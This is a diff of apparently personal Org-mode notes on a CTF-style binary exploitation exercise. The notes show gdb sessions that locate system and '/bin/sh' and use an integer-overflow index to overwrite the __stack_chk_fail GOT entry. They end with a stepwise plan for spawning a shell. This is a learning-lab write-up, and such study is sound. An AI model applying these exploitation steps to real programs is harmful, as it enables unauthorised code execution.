@@ -375,7 +375,6 @@ The source delete env and argv. Then we don't got access to that data.
 #+begin_quote
 Use the store number to modify the return va and search for system "/bin/sh"
 #+end_quote
-
 *** Get system va
 #+begin_src shell
 p system
@@ -385,8 +384,6 @@ $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 #+begin_src shell
 find &system,+9999999,"/bin/sh"
 0xf7f897ec
-
-
 #+end_src
 
 *** read number
@@ -398,7 +395,7 @@ find &system,+9999999,"/bin/sh"
   424 / 4 = 106
 
 #+end_src
-*** Check what does store number
+*** store number
 #+begin_quote
 May overwrite number or s but would be reset.
 May overwrite the canary
@@ -408,7 +405,6 @@ May overwrite the canary
 p/x 183
 $2 = 0xb7
 #+end_src
-
 ***** Check va
 ****** Check system
 #+begin_src shell
@@ -488,14 +484,181 @@ $28 = 0
 Modify ebp-0xc to point esp to another place where esp+4*5 = ret va
 #+end_quote
 
+#+begin_quote
+For what i see i can't exploit or i don't know how.
+#+end_quote
 ****** Canary not preserved
 #+begin_src shell
   0x080489e5 <+706>:	call   0x80484b0 <__stack_chk_fail@plt>
-x/i 0x80484b0
-   0x80484b0 <__stack_chk_fail@plt>:	jmp    DWORD PTR ds:0x804a010
-x/a 0x804a010
-0x804a010 <__stack_chk_fail@got.plt>:	0x80484b6 <__stack_chk_fail@plt+6>
+  x/i 0x80484b0
+  0x80484b0 <__stack_chk_fail@plt>:	jmp    DWORD PTR ds:0x804a010
+  x/a 0x804a010
+  0x804a010 <__stack_chk_fail@got.plt>:	0x80484b6 <__stack_chk_fail@plt+6>
+  p/d (int)($esp+0x24)-0x804a010
+  $3 = -134530460
+  (gdb) p/d ((int)($esp+0x24)-0x804a010) / 4
+  $4 = -33632615
+  Could succesfull use this approach
+  set $a=-33632615
+  $a == 3 * ($a/3)
+  $5 = 0
+
+  let's transform to unsigned int
+  p (unsigned int)-33632615
+  $7 = 4261334681
+  set $a=4261334681
+  (gdb) p   $a == 3 * ($a/3)
+  $9 = 0
 #+end_src
+******* Proof of Concept
+#+begin_src shell
+  Input command: read
+   Index: 106
+   Number at data[106] is 1798355456
+   Completed read command successfully
+  Input command: store
+   Number: 1798355457
+   Index: 106
+   Completed store command successfully
+  Input command: quit
+  ,*** stack smashing detected ***:  terminated
+#+end_src
+******* Let's try to overwrite __stack_chk_fail@got.plt
+
+#+begin_src shell
+            Input command: store
+             Number: 4159090384
+             Index: -33632615
+
+            Program received signal SIGSEGV, Segmentation fault.
+            # May overflow first the reg and add the positive index.
+          p/d 0xffffffff - $eax
+          $27 = 9611
+          # + 1 for leave the register to 0x0
+        p/d (0xffffffff - $eax) + 1
+        $28 = 9612
+
+            p/d ((0xffffffff - $eax) + 1)/4
+          $29 = 2403
+
+      p (int)0x804A010
+      $19 = 134520848
+    p (int)0x804A010/4
+    33630212
+    # add the other operand.
+  p 2403+ 33630212
+  $35 = 33632615
+    the reverse of  esp - got.plt.
+
+    Input command: store
+ Number: 4159090384 // system va
+ Index: 33632615
+(gdb) x/a 0x804A010
+0x804a010 <__stack_chk_fail@got.plt>:	0xf7e6aed0
+(gdb) info symbol 0xf7e6aed0
+system in section .text of /lib32/libc.so.6
+#+end_src
+#+begin_quote
+Need to pass /bin/sh to parameter to system
+#+end_quote
+******** CANC Let's try to pass /bin/sh to system.
+CLOSED: [2025-12-12 Fri 07:15]
+:LOGBOOK:
+- State "CANC"       from              [2025-12-12 Fri 07:15] \\
+  doesn't leave to write there.
+:END:
+#+begin_src shell
+        esp + 8 param - 0x24 (arr_int)
+        p 0x8-0x24
+        $40 = -28
+        (gdb) p (0x8-0x24)/4
+        $41 = -7
+      -7 % 3 != 0
+    p 0xf7f897ec
+    $36 = 4160264172
+    (gdb) x/s 0xf7f897ec
+    0xf7f897ec:	 "/bin/sh"
+  Input command: store
+   Number: 4160264172
+   Index: -7
+   ,*** ERROR! ***
+     This index is reserved for wil!
+   ,*** ERROR! ***
+   Failed to do store command
+   # Then -7 doesn't like the overflow
+  Input command: store
+   Number: 4160264172
+   Index: -8
+   Completed store command successfully
+   #
+   p (unsigned int) -7
+$46 = 4294967289
+set $a=4294967289
+(gdb) p   $a == 3 * ($a/3)
+$47 = 1
+#+end_src
+******** May put little shellcode on s for launch
+#+begin_src shell
+                  arr_int [esp+0x24] -> 0xffffda74
+                  s = [ebp-24h]
+                   p $ebp - 0x24
+                  $48 = (void *) 0xffffdc14// This is gdb outside use ltrace.
+              p 0xffffdc14
+              $49 = 4294958100 + 4 of quit
+            p 0xffffdc14+4
+            $52 = 4294958104
+
+
+
+                    push "/bin/sh"_va //5B
+                    push 0x1// 2B
+                    push system_va // 5B
+                    ret // 1B
+                    "quit".len() + 14B -> 4 + 14 B = 18B
+                    may use 4 B for "quit"
+              p (char[5])"quit"
+              $50 = "quit"
+              (gdb) p (char[4])"quit"
+              Too many array elements
+              (gdb) p (char[6])"quit"
+              $51 = "quit\000"
+
+          Input command: store
+           Number: 4294958104
+           Index: 33632615
+           Completed store command successfully
+
+              x/a 0x804A010
+          0x804a010 <__stack_chk_fail@got.plt>:	0xffffdc18
+
+          p/x 0xffffdc14+4
+        $53 = 0xffffdc18
+
+      Input command: store
+       Number: 0
+       Index: -9
+       Completed store command successfully
+      p 0x24 - (8*4)
+      $54 = 4
+    Input command: store
+     Number: 0
+     Index: -9
+     Completed store command successfully
+     i could write in -8 and -9
+     p 0x24 - (9*4)
+  $56 = 0
+  (gdb) p 0x24 - (8*4)
+  $57 = 4
+      may i put a payload that is push system_va ret
+#+end_src
+#+begin_quote
+Step 1 Overwrite canary. Step 1 and 2 are swappable.
+Step 2 Overwrite __stack_chk_fail with s + 4.
+Step 3 put payload "quit"+payload"push"system_va",ret" payload size < 16B
+Step 3.1 in case the payload want to be symple push system va, ret
+you need use store in index -8 (param system "/bin/sh") and -9 (return system ideally use exit).
+Step 3.2 launch quit+Payload.
+#+end_quote
 **** CANC Mappings
 CLOSED: [2025-12-11 Thu 15:10]
 :LOGBOOK:
@@ -553,6 +716,7 @@ CLOSED: [2025-12-11 Thu 15:10]
   #f7fda000-f7fdb000
   #f7ffd000-f7ffe000
 #+end_quote
+
 * Explotation
 #+begin_src shell
 cat /tmp/$USER - | ./$USER
